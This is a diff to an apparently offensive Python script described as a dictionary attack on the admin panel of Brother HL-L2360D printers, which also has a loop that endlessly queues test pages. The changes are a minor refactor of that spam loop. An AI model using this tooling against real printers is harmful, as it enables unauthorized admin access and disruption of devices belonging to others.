@@ -47,13 +47,13 @@ class Brother:
         resp = requests.post(test_sheet_url, data=payload)
         return resp.ok
 
-    def send_spam_loop(self, password: str):
+    def send_spam_loop(self):
         """ Spam prints test pages
         """
         while True:
             try:
-                if self.send_test_sheet(password):
-                    logging.info("[*] queued priting a test page")
+                if self.send_test_sheet():
+                    logging.info("[*] queued a test page")
                 else:
                     logging.error("[*] Failed to queue a test sheet")
                 time.sleep(3)
@@ -103,9 +103,8 @@ def main(args):
     brother = Brother(ip_address, port, wordlist)
     if args.get("dictionary_attack"):
         return brother.dictionary_attack()
-    password =  args.get("print_spam")
-    if password:
-        brother.send_spam_loop(password)
+    if args.get("print_spam"):
+        brother.send_spam_loop()
 
 if __name__ == "__main__":
     parser = argparse.ArgumentParser(description="Brother Printer Admin Panel Dictionary attack (Designed for the HL-L2360D series)")
